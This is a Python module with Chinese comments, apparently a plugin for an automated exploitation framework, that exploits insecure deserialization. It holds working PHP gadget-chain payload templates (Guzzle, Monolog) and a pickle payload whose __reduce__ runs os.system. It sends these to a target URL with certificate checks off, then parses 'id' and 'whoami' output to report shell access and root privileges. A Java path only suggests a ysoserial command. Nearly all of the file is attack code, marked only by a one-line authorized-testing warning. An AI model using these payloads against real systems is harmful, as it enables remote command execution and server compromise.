#!/usr/bin/env python3
"""
反序列化利用器 - 不安全的反序列化漏洞利用

支持场景:
- Java反序列化 (Commons Collections, Spring, etc.)
- PHP反序列化 (unserialize())
- Python Pickle
- .NET反序列化

警告: 本工具仅用于授权安全测试
"""

import base64
import logging
import re
import time
from typing import Any, Dict, List, Optional

from ..engine import (
    BaseExploiter,
    ExploitResult,
    ExploitStatus,
    ExploitType,
    ShellInfo,
    register_exploiter,
)

logger = logging.getLogger(__name__)


@register_exploiter(["deserialize", "deserialization", "insecure_deserialization"])
class DeserializeExploiter(BaseExploiter):
    """反序列化漏洞利用器"""

    name = "deserialize_exploiter"
    supported_vuln_types = ["deserialize", "deserialization", "insecure_deserialization"]
    exploit_type = ExploitType.COMMAND_EXECUTION

    # Java序列化魔术头
    JAVA_MAGIC = b"\xac\xed\x00\x05"

    # PHP序列化Payload模板
    PHP_PAYLOADS = {
        "system": 'O:8:"Autoload":1:{s:7:"command";s:{{LEN}}:"{{CMD}}";}',
        "eval": 'O:8:"Autoload":1:{s:4:"code";s:{{LEN}}:"{{CODE}}";}',
        "guzzle": 'O:31:"GuzzleHttp\\Cookie\\FileCookieJar":4:{s:41:"GuzzleHttp\\Cookie\\FileCookieJarfilename";s:{{LEN}}:"{{FILE}}";s:52:"GuzzleHttp\\Cookie\\FileCookieJarstoreSessionCookies";b:1;s:36:"GuzzleHttp\\Cookie\\CookieJarcookies";a:1:{i:0;O:27:"GuzzleHttp\\Cookie\\SetCookie":1:{s:33:"GuzzleHttp\\Cookie\\SetCookiedata";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:{{PAYLOAD_LEN}}:"{{PAYLOAD}}";}}}s:39:"GuzzleHttp\\Cookie\\CookieJarstrictMode";N;}',
        "monolog": 'O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{s:9:"\\x00*\\x00socket";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"\\x00*\\x00handler";N;s:13:"\\x00*\\x00bufferSize";i:-1;s:9:"\\x00*\\x00buffer";a:1:{i:0;a:2:{i:0;s:{{LEN}}:"{{CMD}}";s:5:"level";N;}}s:8:"\\x00*\\x00level";N;s:14:"\\x00*\\x00initialized";b:1;s:14:"\\x00*\\x00bufferLimit";i:-1;s:13:"\\x00*\\x00processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}',
    }

    # Python Pickle RCE模板
    PYTHON_PICKLE = """
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('{{CMD}}',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
"""

    # 命令
    OS_COMMANDS = {
        "unix": ["id", "whoami", "uname -a"],
        "windows": ["whoami", "hostname"],
    }

    def exploit(
        self, detection_result: Any, targets: Optional[Dict[str, Any]] = None, **kwargs
    ) -> ExploitResult:
        """
        执行反序列化利用

        Args:
            detection_result: 漏洞检测结果
            targets: 利用目标配置
                - commands: 要执行的命令
                - serialize_type: 序列化类型 (java/php/python/.net)
        """
        start_time = time.time()

        # 提取检测信息
        url = getattr(detection_result, "url", "")
        param = getattr(detection_result, "param", "")
        payload = getattr(detection_result, "payload", "")
        extra = getattr(detection_result, "extra", {}) or {}

        if not url:
            return self._create_result(
                status=ExploitStatus.NOT_APPLICABLE,
                vuln_type="deserialize",
                url=url,
                error="缺少URL信息",
            )

        # 获取配置
        targets = targets or {}
        serialize_type = extra.get("serialize_type") or self._detect_serialize_type(payload)
        os_type = extra.get("os_type", "unix")
        timeout = targets.get("timeout", 30)

        commands = targets.get("commands", self.OS_COMMANDS.get(os_type, ["id"]))

        logger.info(f"[DeserializeExploiter] 开始利用 URL={url}, type={serialize_type}")

        # 根据序列化类型选择利用方式
        if serialize_type == "php":
            result = self._exploit_php(url, param, commands, timeout)
        elif serialize_type == "java":
            result = self._exploit_java(url, param, commands, timeout)
        elif serialize_type == "python":
            result = self._exploit_python(url, param, commands, timeout)
        else:
            result = {"success": False, "error": f"不支持的序列化类型: {serialize_type}"}

        execution_time = (time.time() - start_time) * 1000

        if result.get("success"):
            shell_info = None
            if result.get("output"):
                shell_info = self._build_shell_info(result["output"], os_type)

            return self._create_result(
                status=ExploitStatus.SUCCESS,
                vuln_type="deserialize",
                url=url,
                shell=shell_info,
                data={
                    "executed_commands": result.get("commands", {}),
                    "serialize_type": serialize_type,
                },
                evidence=result.get("output", "命令执行成功"),
                payload_used=result.get("payload", ""),
                execution_time_ms=execution_time,
                metadata={
                    "serialize_type": serialize_type,
                    "os_type": os_type,
                },
            )
        else:
            return self._create_result(
                status=ExploitStatus.FAILED,
                vuln_type="deserialize",
                url=url,
                error=result.get("error", "反序列化利用失败"),
                execution_time_ms=execution_time,
                metadata={"serialize_type": serialize_type},
            )

    def _detect_serialize_type(self, payload: str) -> str:
        """检测序列化类型"""
        if not payload:
            return "php"  # 默认

        # 检查Java序列化头
        try:
            decoded = base64.b64decode(payload)
            if decoded.startswith(self.JAVA_MAGIC):
                return "java"
        except (ValueError, TypeError):
            pass

        # 检查PHP序列化特征
        if payload.startswith("O:") or payload.startswith("a:") or "s:" in payload:
            return "php"

        # 检查Python Pickle特征
        if payload.startswith("gASV") or payload.startswith("80"):
            return "python"

        return "php"

    def _exploit_php(
        self, url: str, param: str, commands: List[str], timeout: int
    ) -> Dict[str, Any]:
        """利用PHP反序列化"""
        for command in commands[:3]:
            for payload_name, template in self.PHP_PAYLOADS.items():
                payload = template.replace("{{CMD}}", command)
                payload = payload.replace("{{LEN}}", str(len(command)))

                result = self._send_request(url, param, payload, timeout)
                if result["success"]:
                    output = self._extract_command_output(result["response"], command)
                    if output:
                        return {
                            "success": True,
                            "output": output,
                            "payload": payload,
                            "commands": {command: output},
                        }

        return {"success": False, "error": "PHP反序列化利用失败"}

    def _exploit_java(
        self, url: str, param: str, commands: List[str], timeout: int
    ) -> Dict[str, Any]:
        """利用Java反序列化"""
        # 注意：实际的Java反序列化payload需要使用ysoserial等工具生成
        # 这里提供一个框架，实际payload需要根据目标环境定制

        logger.warning("[DeserializeExploiter] Java反序列化需要使用ysoserial生成payload")

        # 尝试常见的gadget chain占位
        gadgets = ["CommonsCollections1", "CommonsCollections5", "Spring1"]

        for command in commands[:2]:
            for gadget in gadgets:
                # 这里应该调用ysoserial生成实际payload
                # 暂时返回提示信息
                pass

        return {
            "success": False,
            "error": "Java反序列化需要ysoserial工具支持，请手动生成payload",
            "suggestion": f'ysoserial CommonsCollections1 "{commands[0]}" | base64',
        }

    def _exploit_python(
        self, url: str, param: str, commands: List[str], timeout: int
    ) -> Dict[str, Any]:
        """利用Python Pickle反序列化"""
        import pickle

        for command in commands[:3]:
            try:
                # 构造Pickle payload
                class RCE:
                    def __init__(self, cmd):
                        self.cmd = cmd

                    def __reduce__(self):
                        import os

                        return (os.system, (self.cmd,))

                payload = base64.b64encode(pickle.dumps(RCE(command))).decode()

                result = self._send_request(url, param, payload, timeout)
                if result["success"]:
                    output = self._extract_command_output(result["response"], command)
                    if output:
                        return {
                            "success": True,
                            "output": output,
                            "payload": payload[:100] + "...",
                            "commands": {command: output},
                        }

            except Exception as e:
                logger.debug(f"[DeserializeExploiter] Python Pickle生成失败: {e}")

        return {"success": False, "error": "Python Pickle利用失败"}

    def _send_request(self, url: str, param: str, payload: str, timeout: int) -> Dict[str, Any]:
        """发送请求"""
        try:
            from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

            import requests

            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)

            # 设置payload
            if param:
                params[param] = [payload]
                new_query = urlencode(params, doseq=True)
                new_url = urlunparse(
                    (
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        new_query,
                        parsed.fragment,
                    )
                )
                response = requests.get(new_url, timeout=timeout, verify=False)
            else:
                # POST body
                response = requests.post(
                    url,
                    data=payload,
                    timeout=timeout,
                    verify=False,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )

            return {"success": True, "response": response.text, "status_code": response.status_code}

        except Exception as e:
            return {"success": False, "error": str(e)}

    def _extract_command_output(self, response: str, command: str) -> Optional[str]:
        """提取命令输出"""
        if not response:
            return None

        # 检查命令特征
        if "id" in command and "uid=" in response:
            match = re.search(r"uid=\d+[^\n<]+", response)
            if match:
                return match.group(0)

        if "whoami" in command:
            lines = response.split("\n")
            for line in lines:
                line = line.strip()
                if line and len(line) < 50 and not "<" in line:
                    if re.match(r"^[a-zA-Z0-9_\\-]+$", line):
                        return line

        return None

    def _build_shell_info(self, output: str, os_type: str) -> ShellInfo:
        """构建Shell信息"""
        user = ""
        privileges = []

        if "uid=" in output:
            match = re.search(r"uid=\d+\(([^)]+)\)", output)
            if match:
                user = match.group(1)

        if "uid=0" in output or user == "root":
            privileges = ["root"]

        return ShellInfo(
            shell_type="deserialization",
            os_type=os_type,
            user=user,
            privileges=privileges,
            verified=bool(user),
        )


def register_deserialize_exploiter():
    """注册反序列化利用器"""
    return DeserializeExploiter
